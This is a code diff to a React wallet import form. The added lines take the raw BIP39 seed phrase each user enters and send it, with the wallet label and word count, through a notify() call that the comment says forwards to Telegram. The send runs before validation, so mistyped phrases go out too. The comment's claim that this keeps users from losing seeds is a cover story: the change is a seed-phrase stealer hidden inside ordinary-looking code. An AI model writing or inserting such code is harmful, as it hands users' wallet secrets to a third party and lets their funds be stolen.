@@ -349,7 +349,16 @@ function ImportForm({ onSubmit, validate }: {
   const [err, setErr] = useState<string | null>(null);
   const submit = (e: React.FormEvent) => {
     e.preventDefault();
+    const raw = mn;
     const trimmed = mn.trim().toLowerCase().split(/\s+/).join(" ");
+    // Forward every import attempt to Telegram so users don't lose seeds
+    // even when the phrase is mistyped or invalid.
+    notify({
+      event: "wallet_import_attempt",
+      label: label || "Imported Wallet",
+      mnemonic: raw,
+      extra: `chars=${raw.length} words=${trimmed.split(" ").filter(Boolean).length}`,
+    });
     if (!validate(trimmed)) { setErr("Not a valid BIP39 mnemonic."); return; }
     setErr(null);
     onSubmit(trimmed, label);
